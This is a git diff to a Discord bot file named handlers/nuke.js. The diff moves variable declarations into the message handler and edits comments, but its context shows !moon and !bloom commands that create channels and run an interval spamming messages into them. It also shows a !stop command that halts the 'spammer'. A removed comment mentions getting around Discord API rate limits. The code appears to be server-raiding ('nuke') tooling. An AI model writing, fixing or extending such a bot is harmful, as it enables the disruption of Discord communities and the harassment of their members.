@@ -1,6 +1,4 @@
 // handlers/nuke.js
-const guild = message.guild;
-const command = message.content.toLowerCase();
 const { ChannelType } = require("discord.js");
 
 let welcomeInterval = null;
@@ -13,6 +11,9 @@ const BANNER_URL = "https://cdn.discordapp.com/attachments/1531280455553388564/1
 module.exports = (client) => {
     client.on("messageCreate", async (message) => {
         if (message.author.bot || !message.guild) return;
+
+        const guild = message.guild;
+        const command = message.content.toLowerCase();
 
         // ==========================================
         // 1. COMMAND: !moon
@@ -82,7 +83,7 @@ module.exports = (client) => {
                     welcomeInterval = null;
                 }
 
-                // 7. Interval spam (Discord API rate-limits ke bachte hue)
+                // 7. Interval spam
                 welcomeInterval = setInterval(async () => {
                     for (const channel of newChannels) {
                         await channel.send({
@@ -186,7 +187,7 @@ module.exports = (client) => {
                     welcomeInterval = null;
                 }
 
-                // 7. Interval spam (Discord API rate-limits ke bachte hue)
+                // 7. Interval spam
                 welcomeInterval = setInterval(async () => {
                     for (const channel of newChannels) {
                         await channel.send({
@@ -200,16 +201,15 @@ module.exports = (client) => {
                 console.error("Error executing !bloom command:", error);
             }
         }
-      
               
         // ==========================================
-        // 4. COMMAND: !stop (Spam rokne ke liye optional)
+        // 4. COMMAND: !stop
         // ==========================================
         if (command === "!stop") {
             if (welcomeInterval) {
                 clearInterval(welcomeInterval);
                 welcomeInterval = null;
-                await message.channel.send(" Spammer band kar diya gaya.").catch(() => {});
+                await message.channel.send("🛑 Spammer band kar diya gaya.").catch(() => {});
             }
         }
     });
